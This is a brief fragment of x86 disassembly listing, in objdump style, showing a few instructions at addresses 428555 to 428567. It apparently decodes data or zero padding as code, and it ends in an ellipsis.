  428555:	maxps  xmm1,XMMWORD PTR [edx-0x14]
  428559:	adc    edi,edi
  42855b:	pop    DWORD PTR ds:0xdf443cb5
  428561:	or     al,0x0
  428563:	add    BYTE PTR [eax],al
  428565:	add    BYTE PTR [eax],al
  428567:	add    BYTE PTR [eax],al
	...
